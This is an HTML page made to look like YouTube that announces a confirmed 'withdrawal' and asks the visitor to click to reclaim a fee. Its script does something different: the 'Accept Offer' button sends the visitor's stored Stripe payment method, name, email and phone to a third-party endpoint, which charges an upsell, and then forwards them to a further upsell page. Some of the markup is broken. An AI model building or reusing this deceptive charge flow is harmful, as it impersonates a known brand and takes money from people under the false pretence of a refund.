<!DOCTYPE html>
<html lang="en">

  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids

  defer

<title>Withdrawal request confirmed</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>

:root {
  --green: #14b981;
  --green-dark: #72e3ad;
  --pink: #ec3b92;
  --red: #ff0000;
  --red-dark: #cc0000;
  --ink: #ffffff;
  --muted: #aaaaaa;
  --background: #0f0f0f;
  --border: #2f2f2f;
  --card: #181818;
  --surface: #242424;
}

*, *::before, *::after {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html {
  min-height: 100%;
}

body {
  min-height: 100vh;
  font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  color: var(--ink);
  background: #0f0f0f;
  overflow-x: hidden;
  -webkit-font-smoothing: antialiased;
}

/* =========================================
   YOUTUBE HEADER
========================================= */

.youtube-header {
  position: relative;
  z-index: 20;
  width: 100%;
  height: 72px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #0f0f0f;
  border-bottom: 1px solid #2a2a2a;
  box-shadow: 0 1px 5px rgba(0, 0, 0, 0.35);
}

.youtube-header a {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  text-decoration: none;
}

.youtube-logo {
  display: block;
  width: 180px;
  height: auto;
  transition: transform .2s ease;
}

.youtube-header a:hover .youtube-logo {
  transform: scale(1.025);
}

/* =========================================
   PAGE
========================================= */

.page {
  position: relative;
  min-height: calc(100vh - 72px);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 40px 18px;
  overflow: hidden;
  background: #0f0f0f;
}

/* Background decorations */

.background-shape {
  position: fixed;
  border-radius: 999px;
  filter: blur(90px);
  opacity: .10;
  pointer-events: none;
  animation: drift 12s ease-in-out infinite alternate;
}

.background-shape.one {
  width: 300px;
  height: 300px;
  top: 50px;
  left: -120px;
  background: #ff0000;
}

.background-shape.two {
  width: 350px;
  height: 350px;
  right: -140px;
  bottom: -100px;
  background: #ff0000;
  animation-delay: -5s;
}

@keyframes drift {
  to {
    transform: translate(26px, -18px) scale(1.08);
  }
}

/* =========================================
   MAIN
========================================= */

main {
  position: relative;
  z-index: 1;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* =========================================
   CARD
========================================= */

.card {
  position: relative;
  width: min(100%, 620px);
  padding: 44px 48px 36px;
  text-align: center;
  background: #181818;
  border: 1px solid #2f2f2f;
  border-radius: 14px;
  box-shadow: 0 18px 50px rgba(0, 0, 0, 0.45);
  animation: card-in .7s cubic-bezier(.16, 1, .3, 1) both;
}

/* Barra vermelha estilo YouTube */

.card::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: #ff0000;
  border-radius: 14px 14px 0 0;
}

@keyframes card-in {
  from {
    opacity: 0;
    transform: translateY(18px) scale(.97);
  }

  to {
    opacity: 1;
    transform: translateY(0) scale(1);
  }
}

/* =========================================
   CHECK
========================================= */

.check {
  position: relative;
  width: 96px;
  height: 96px;
  margin: 0 auto 24px;
  filter: drop-shadow(0 10px 22px rgba(20, 185, 129, .25));
  animation: check-in .65s .18s cubic-bezier(.34, 1.56, .64, 1) both;
}

.check::after {
  content: "";
  position: absolute;
  inset: 0;
  z-index: -1;
  border-radius: 50%;
  background: var(--green);
  animation: halo 2.2s 1.2s infinite;
}

.check svg {
  display: block;
  width: 100%;
  height: 100%;
}

@keyframes check-in {
  from {
    opacity: 0;
    transform: scale(.2) rotate(-25deg);
  }

  to {
    opacity: 1;
    transform: scale(1) rotate(0);
  }
}

@keyframes halo {
  from {
    opacity: .32;
    transform: scale(1);
  }

  to {
    opacity: 0;
    transform: scale(1.55);
  }
}

/* =========================================
   STATUS
========================================= */

.status {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 22px;
  padding: 9px 16px;
  border: 1px solid #355c49;
  border-radius: 999px;
  color: #8df0bc;
  background: #1d3328;
  font-size: 13px;
  font-weight: 700;
}

.status svg {
  width: 17px;
  height: 17px;
  flex: none;
}

/* =========================================
   TITLES
========================================= */

h1 {
  margin-bottom: 12px;
  color: #ffffff;
  font-size: clamp(34px, 7vw, 48px);
  line-height: 1.05;
  letter-spacing: -.045em;
  font-weight: 900;
}

.lead {
  margin-bottom: 18px;
  color: #f1f1f1;
  font-size: clamp(19px, 4vw, 24px);
  line-height: 1.3;
  font-weight: 700;
}

.description {
  max-width: 470px;
  margin: 0 auto 25px;
  color: #a9a9a9;
  font-size: 15px;
  line-height: 1.55;
}

/* =========================================
   COoud FLOW
========================================= */

[data-cooud-flow-root] {
  display: flex !important;
  flex-direction: column !important;
  align-items: center !important;
  justify-content: center !important;
  gap: 10px !important;
  width: 100% !important;
  margin: 0 auto !important;
  font-family: inherit !important;
}

/* =========================================
   PRIMARY BUTTON
========================================= */

button[data-cooud-flow-primary] {
  position: relative !important;
  display: flex !important;
  align-items: center !important;
  justify-content: center !important;

  width: 100% !important;
  max-width: 380px !important;
  min-width: 0 !important;
  min-height: 58px !important;

  padding: 16px 26px !important;

  overflow: hidden !important;

  border: 0 !important;
  border-radius: 4px !important;

  color: #ffffff !important;

  background: #ff0000 !important;

  box-shadow: 0 6px 18px rgba(255, 0, 0, .25) !important;

  font-family: inherit !important;
  font-size: 17px !important;
  font-weight: 800 !important;

  cursor: pointer !important;

  transition:
    background .15s ease,
    transform .15s ease,
    box-shadow .15s ease !important;
}

button[data-cooud-flow-primary]::before {
  content: "";
  position: absolute;
  inset: 0;

  background: linear-gradient(
    110deg,
    transparent 25%,
    rgba(255,255,255,.25) 50%,
    transparent 75%
  );

  transform: translateX(-130%);
  animation: shine 4s infinite;
}

button[data-cooud-flow-primary]:hover {
  background: #cc0000 !important;
  transform: translateY(-1px) !important;
  box-shadow: 0 8px 22px rgba(255, 0, 0, .32) !important;
}

button[data-cooud-flow-primary]:active {
  transform: scale(.985) !important;
}

/* =========================================
   DISMISS BUTTON
========================================= */

button[data-cooud-flow-dismiss] {
  display: flex !important;
  align-items: center !important;
  justify-content: center !important;

  width: auto !important;
  min-height: 38px !important;

  padding: 7px 16px !important;

  border: 0 !important;
  border-radius: 4px !important;

  color: #aaaaaa !important;
  background: transparent !important;

  font-family: inherit !important;
  font-size: 13px !important;
  font-weight: 500 !important;

  cursor: pointer !important;

  transition:
    color .2s ease,
    background .2s ease !important;
}

button[data-cooud-flow-dismiss]:hover {
  color: #ffffff !important;
  background: #242424 !important;
}

@keyframes shine {
  0%, 25% {
    transform: translateX(-130%);
  }

  65%, 100% {
    transform: translateX(130%);
  }
}

/* =========================================
   BADGES
========================================= */

.badges {
  display: flex;
  justify-content: center;
  flex-wrap: wrap;
  gap: 8px;
  margin-top: 28px;
}

.badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;

  padding: 8px 12px;

  border: 1px solid #383838;
  border-radius: 5px;

  color: #b3b3b3;
  background: #242424;

  font-size: 11px;
  font-weight: 600;
}

.badge svg {
  width: 15px;
  height: 15px;
}

/* =========================================
   NOTE
========================================= */

.note {
  margin-top: 15px;
  color: #777777;
  font-size: 11px;
  line-height: 1.45;
}

/* =========================================
   MOBILE
========================================= */

@media (max-width: 560px) {

  .youtube-header {
    height: 64px;
    padding: 0 14px;
  }

  .youtube-logo {
    width: 150px;
  }

  .page {
    min-height: calc(100vh - 64px);
    padding: 20px 12px;
    background: #0f0f0f;
  }

  .card {
    padding: 34px 20px 28px;
    border-radius: 12px;
    background: #181818;
  }

  .card::before {
    border-radius: 12px 12px 0 0;
  }

  .check {
    width: 86px;
    height: 86px;
    margin-bottom: 21px;
  }

  .status {
    padding: 8px 12px;
    font-size: 12px;
  }

  h1 {
    font-size: 33px;
  }

  .lead {
    font-size: 18px;
  }

  .description {
    font-size: 14px;
    margin-bottom: 22px;
    color: #a7a7a7;
  }

  button[data-cooud-flow-primary] {
    max-width: 100% !important;
    min-height: 56px !important;
    padding: 15px 20px !important;
    font-size: 16px !important;
  }

  .badges {
    gap: 6px;
    margin-top: 23px;
  }

  .badge {
    padding: 7px 9px;
    font-size: 10px;
  }
}

@media (max-width: 360px) {

  .youtube-logo {
    width: 140px;
  }

  .card {
    padding-left: 16px;
    padding-right: 16px;
  }

  h1 {
    font-size: 30px;
  }

  .badge {
    font-size: 9.5px;
  }
}

@media (prefers-reduced-motion: reduce) {

  *,
  *::before,
  *::after {
    animation-duration: .01ms !important;
    animation-iteration-count: 1 !important;
    scroll-behavior: auto !important;
  }

}

</style>
</head>

<body>

<!-- =========================================
     YOUTUBE HEADER / LOGO
========================================= -->

<header class="youtube-header">

  <a
    href="https://www.youtube.com/"
    target="_blank"
    rel="noopener noreferrer"
    aria-label="YouTube"
  >

    <svg
      class="youtube-logo"
      viewBox="0 0 210 60"

      aria-hidden="true"
    >

      <!-- YouTube Play Icon -->
      <rect

      />

      <path
        d="M30 20.5L51 30L30 39.5V20.5Z"

      <!-- YouTube Text -->
      <text

<div class="page">

  <div

    aria-hidden="true"
  ></div>

  <div

    aria-hidden="true"
  ></div>


  <main data-funnel-view="upsell_2">

    <section
      class="card"
      aria-labelledby="page-title"
    >

      <span class="language"> </span>


      <div
        class="check"
        aria-hidden="true"
      >

        <svg
          viewBox="0 0 100 100"
          xmlns="http://www.w3.org/2000/svg"
        >

          <circle
            cx="50"
            cy="50"
            r="48"
            fill="#14b981"
          />

          <path
            d="M27 51.5 43 67.5 74 34.5"
            fill="none"
            stroke="#fff"
            stroke-width="9"
            stroke-linecap="round"
            stroke-linejoin="round"
          />

        </svg>

      </div>


      <div class="status">

        <svg
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2.6"
          stroke-linecap="round"
          stroke-linejoin="round"
          aria-hidden="true"
        >

          <path d="m5 12 4 4L19 6"/>

        </svg>

        Withdrawal request confirmed

      </div>


      <h1 id="page-title">
        Congratulations!
      </h1>


      <p class="lead">
        You will receive the amount shortly.
      </p>


      <p class="description">
        Click the button below to request a refund of your fee.
      </p>


      <div class="btn-wrap">
        <a href="#accept"
           id="btnAcceptUpsell"
           data-funnel-step="upsell_2"
           style="font-family: 'Poppins', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 18px; font-weight: 600; line-height: 1.3; color: #ffffff; background-color: #0872e2; border: none; border-radius: 10px; padding: 13px 7%; cursor: pointer; text-align: center; display: block; width: fit-content; margin: auto; text-decoration: none;">
          Accept Offer
        </a>

        <div id="upsellError" style="display: none; color: #f87171; font-size: 13px; font-weight: 600; margin-top: 12px; text-align: center;"></div>

        <a href="#decline"
           id="btnDeclineUpsell"
           style="font-family: 'Poppins', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; color: #666666; text-align: center; display: block; margin: 16px auto 0; text-decoration: underline;">
          No, thanks. I don't want this offer.
        </a>

      <div

        aria-label="Security guarantees"

        <span class="badge">

          <svg

            aria-hidden="true"
          >

            <rect
              x="3"

              height="11"

            <path

        <span class="badge">

            viewBox="0 0 24 24"

      <p class="note">
        Process protected by a secure connection.
      </p>

  </main>

</div>

<script>
(function () {
  var STORAGE_KEY = 'yt_funnel_params';
  var WORKER_URL = 'https://yt-pay.morganstudio.store/api/stripe-charge-upsell';
  var NEXT_URL = 'https://morganstudio.store/youtube/up3/';

  function getMergedParams() {
    var merged = {};
    try {
      var raw = localStorage.getItem(STORAGE_KEY);
      if (raw) {
        var parsed = JSON.parse(raw);
        if (parsed && typeof parsed === 'object') merged = parsed;
      }
    } catch (e) {}
    try {
      new URLSearchParams(window.location.search).forEach(function (v, k) {
        if (v) merged[k] = v;
      });
    } catch (e) {}
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(merged));
    } catch (e) {}
    return merged;
  }

  function buildUrlWithParams(baseUrl, extra) {
    var params = getMergedParams();
    if (extra) {
      for (var k in extra) {
        if (extra[k] != null) params[k] = extra[k];
      }
    }
    var qs = new URLSearchParams();
    for (var key in params) {
      if (params[key] != null && params[key] !== '') {
        qs.set(key, params[key]);
      }
    }
    var q = qs.toString();
    return baseUrl + (q ? (baseUrl.indexOf('?') > -1 ? '&' : '?') + q : '');
  }

  var params = getMergedParams();
  var customerId = params.cid || params.customer_id || '';
  var paymentMethodId = params.pm || params.payment_method_id || '';
  var stripeAccount = params.acc || 'a';
  var name = params.name || '';
  var email = params.email || params.e || '';
  var phone = params.phone || '';

  var btnAccept = document.getElementById('btnAcceptUpsell');
  var btnDecline = document.getElementById('btnDeclineUpsell');
  var errorEl = document.getElementById('upsellError');
  var isProcessing = false;

  if (btnAccept) {
    btnAccept.addEventListener('click', function (e) {
      e.preventDefault();
      if (isProcessing) return;

      if (!customerId || !paymentMethodId) {
        window.location.href = buildUrlWithParams(NEXT_URL);
        return;
      }

      isProcessing = true;
      btnAccept.style.opacity = '0.7';
      btnAccept.style.pointerEvents = 'none';
      btnAccept.textContent = 'Processing...';
      if (errorEl) errorEl.style.display = 'none';

      var qs = new URLSearchParams(params).toString();
      var chargeEndpoint = WORKER_URL + (qs ? '?' + qs : '');

      fetch(chargeEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_id: customerId,
          payment_method_id: paymentMethodId,
          upsell_number: 2,
          name: name,
          email: email,
          phone: phone,
          stripe_account: stripeAccount,
          extra_params: params
        })
      })
        .then(function (r) { return r.json(); })
        .then(function (data) {
          if (data && data.ok) {
            btnAccept.textContent = 'Confirmed! Redirecting...';
            var target = data.next_url || buildUrlWithParams(NEXT_URL, { upsell2_bought: '1' });
            setTimeout(function () {
              window.location.href = target;
            }, 400);
          } else {
            isProcessing = false;
            btnAccept.style.opacity = '1';
            btnAccept.style.pointerEvents = 'auto';
            btnAccept.textContent = 'Accept Offer';
            if (errorEl) {
              errorEl.textContent = (data && data.error) || 'Payment could not be processed. Please try again.';
              errorEl.style.display = 'block';
            }
          }
        })
        .catch(function () {
          window.location.href = buildUrlWithParams(NEXT_URL);
        });
    });
  }

  if (btnDecline) {
    btnDecline.addEventListener('click', function (e) {
      e.preventDefault();
      window.location.href = buildUrlWithParams(NEXT_URL, { upsell2_declined: '1' });
    });
  }
})();
</script>
